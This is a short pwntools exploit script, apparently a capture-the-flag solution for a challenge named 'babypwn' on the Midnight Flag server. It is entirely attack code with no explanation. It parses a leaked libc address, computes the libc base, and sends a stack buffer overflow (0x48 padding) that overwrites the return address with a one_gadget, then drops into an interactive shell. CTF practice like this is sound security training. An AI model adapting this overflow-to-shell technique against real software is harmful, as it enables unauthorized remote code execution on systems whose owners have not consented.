#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("babypwn_patched")
libc = elf.libc

local = False 
if local:
    p = process("./babypwn_patched")
    gdb.attach(p,'''b*vuln+61\nc''')
else:
    p = remote('babypwn.pwn.midnightflag.fr', 16000)

elf = context.binary = ELF('./babypwn_patched', checksec=False)



og1 = 0x50a37
og2 = 0xebcf1
og3 = 0xebcf5
og4 = 0xebcf8


p.recvuntil(b"There you go, libc leak: 0x")
libc_base = int(p.recv(12),16) - 395120
print("[+]Leak: ", hex(libc_base))
og = libc_base+og1
print("[+]One_gadget: ", hex(og))
payload = b"\x00"*0x48 + p64(og)
p.sendline(payload)
p.interactive()